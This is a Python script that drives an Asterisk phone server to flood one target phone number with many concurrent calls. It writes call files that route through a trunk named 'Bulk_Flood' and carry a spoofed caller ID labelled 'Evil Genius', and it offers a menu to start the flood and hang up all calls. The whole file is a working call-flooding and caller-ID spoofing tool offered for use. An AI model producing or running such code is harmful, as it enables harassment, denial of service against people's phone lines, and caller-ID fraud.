import os
import random
import shutil
import time
import subprocess
import logging
import phonenumbers
from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiofiles  # Ensure aiofiles is installed using pip

# Setup basic logging
logging.basicConfig(filename='call_placement.log', level=logging.INFO, format='%(asctime)s %(message)s')

def generate_phone_number(area_code=None):
    if area_code is None:
        area_code_N = random.choice('23456789')
        area_code_XX = ''.join(random.choice('0123456789') for _ in range(2))
        area_code = f"{area_code_N}{area_code_XX}"
    
    prefix_N = random.choice('23456789')
    prefix_XX = ''.join(random.choice('0123456789') for _ in range(2))
    prefix = f"{prefix_N}{prefix_XX}"
    
    subscriber_number = ''.join(random.choice('0123456789') for _ in range(4))
    
    return f"1{area_code}{prefix}{subscriber_number}"

def validate_phone_number(phone_number):
    try:
        parsed = phonenumbers.parse(phone_number, "US")
        if phonenumbers.is_valid_number(parsed):
            return phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
        return None
    except phonenumbers.NumberParseException:
        return None

def validate_area_code(area_code):
    return len(area_code) == 3 and area_code[0] in '23456789' and area_code[1:].isdigit()

async def process_call(source_file, destination_dir, target_number, caller_id, iteration, delay):
    try:
        temp_file_path = f"/tmp/callfile_{iteration}.call"
        async with aiofiles.open(source_file, 'r') as file, aiofiles.open(temp_file_path, 'w') as new_file:
            async for line in file:
                if line.startswith('Channel:'):
                    await new_file.write(f'Channel: PJSIP/{target_number}@Bulk_Flood\n')
                elif line.startswith('CallerID:'):
                    await new_file.write(f'CallerID: "Evil Genius" <{caller_id}>\n')
                else:
                    await new_file.write(line)
        
        await asyncio.create_subprocess_shell(f'chmod 777 {temp_file_path}')
        await asyncio.create_subprocess_shell(f'chown asterisk:asterisk {temp_file_path}')
        
        shutil.move(temp_file_path, os.path.join(destination_dir, f"callfile_{iteration}.call"))
        logging.info(f"Call placed with target number {target_number} and Caller ID {caller_id}")

        await asyncio.sleep(delay)
    except Exception as e:
        logging.error(f"An error occurred in call {iteration}: {e}")

async def create_calls_concurrently(source_file, destination_dir, num_calls, target_number, caller_id, delay):
    await asyncio.gather(*(process_call(source_file, destination_dir, target_number, caller_id, i, delay) for i in range(num_calls)))

async def hangup_all_calls():
    try:
        await asyncio.create_subprocess_shell("asterisk -rx 'channel request hangup all'")
        logging.info("All calls have been hung up.")
    except Exception as e:
        logging.error(f"Failed to hang up all calls: {e}")

async def main():
    source_file = 'callfile.bak'
    destination_dir = '/var/spool/asterisk/outgoing'

    while True:
        print("\nOptions:")
        print("1 - Initiate Calls")
        print("2 - Hang Up All Calls")
        print("3 - Exit Program")
        user_choice = input("Select an option: ").strip()

        if user_choice == "1":
            target_number = input("Enter the target phone number (1NXXNXXXXXX format): ").strip()
            formatted_target_number = validate_phone_number(target_number)
            if not formatted_target_number:
                print("Invalid target phone number.")
                continue

            caller_id = input("Enter your desired Caller ID (NXXNXXXXXX format): ").strip()
            formatted_caller_id = validate_phone_number("1" + caller_id)
            if not formatted_caller_id:
                print("Invalid Caller ID.")
                continue

            num_calls = int(input("How many calls do you want to place?: ").strip())
            delay = float(input("Enter the delay between calls (in seconds): ").strip())

            await create_calls_concurrently(source_file, destination_dir, num_calls, formatted_target_number, formatted_caller_id, delay)

        elif user_choice == "2":
            await hangup_all_calls()

        elif user_choice == "3":
            print("Exiting program.")
            break

        else:
            print("Invalid option. Please select 1, 2, or 3.")

if __name__ == "__main__":
    asyncio.run(main())
